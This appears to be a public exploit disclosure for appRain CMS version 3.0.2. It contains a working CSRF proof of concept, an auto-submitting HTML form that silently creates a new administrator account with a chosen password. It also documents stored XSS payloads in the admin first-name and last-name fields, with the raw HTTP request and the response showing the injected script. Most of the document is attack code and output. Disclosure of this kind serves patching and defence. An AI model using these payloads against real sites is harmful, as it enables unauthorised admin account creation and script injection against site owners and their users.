###########################################################
[~] Exploit Title:appRain-v-3.0.2::stored XSS on multiple Parameters & CSRF
vulnerability's
[~] Author: sajith
[~] version: appRain-v-3.0.2
[~] vulnerable app link:http://www.apprain.com/download
###########################################################

1)Attacker can create new admin users by exploiting "Add New admin"
functionality via CSRF vulnerability in the Admin panel


POC:

<html lang="en">
<head>
<title>POC by Sajith Shetty</title>
</head>
<body>
<form action="http://127.0.0.1/cms/appRain-v-3.0.2/admin/manage/add/"
id="formid" method="post">
<input type="hidden" name="data[Admin][f_name]" value="first_name" />
<input type="hidden" name="data[Admin][l_name]" value="last_name"/>
<input type="hidden" name="data[Admin][email]" value="test@test.com" />
<input type="hidden" name="data[Admin][username]" value="testing" />
<input type="hidden" name="data[Admin][password]" value="T#utw8on007" />
<input type="hidden" name="data[Admin][status]" value="Active" />
<input type="hidden" name="data[Admin][description]" value="testing" />
</form>
<script>
document.getElementById('formid').submit();
</script>
</body>
</html>


2)stored XSS in multiple parameter's:


steps:

1) log into the admin panel and access the link
http://127.0.0.1/cms/appRain-v-3.0.2/admin/manage/add


2)Input the payload in the "first name" and "last name"  field

            payload:"><img src=x onerror=prompt(1);>

3)click on manage Admins functionality to execute the payload.



request:

POST /cms/appRain-v-3.0.2/admin/manage/add/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101
Firefox/14.0.1
Accept: */*
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://127.0.0.1/cms/appRain-v-3.0.2/admin/manage/add
Content-Length: 344
Cookie: PHPSESSID=84ceiepe7pus96194mbt9m6vf3
Pragma: no-cache
Cache-Control: no-cache

data%5BAdmin%5D%5Bf_name%5D=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3B%3E&data%5BAdmin%5D%5Bl_name%5D=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(2)%3B%3E&data%5BAdmin%5D%5Bemail%5D=testing%
40xyz.com
&data%5BAdmin%5D%5Busername%5D=test1&data%5BAdmin%5D%5Bpassword%5D=T%24asw123&data%5BAdmin%5D%5Bstatus%5D=Active&data%5BAdmin%5D%5Bdescription%5D=test


response:

                            <label for="input">First Name:</label>
                        </div>
                        <div class="input">
                            <input type="text" name="data[Admin][f_name]"
value=""><img src=x onerror=prompt(1);>"  id="f_name" class="large
check_notempty" longdesc="Please enter  first name" />
   </div>
                    </div>
                    <div class="field">
                        <div class="label">
                            <label for="l_name">Last Name:</label>
                        </div>
                        <div class="input">
                            <input type="text" name="data[Admin][l_name]"
value=""><img src=x onerror=prompt(2);>"  id="l_name" class="large
check_notempty" longdesc="Please enter last name" />
 </div>
                    </div>



{#}Access the URL
http://127.0.0.1/cms/appRain-v-3.0.2/category/manage/blog-cat/update/6where
"blog category" "description" and "sort order" input fields are
vulnerable to stored xss
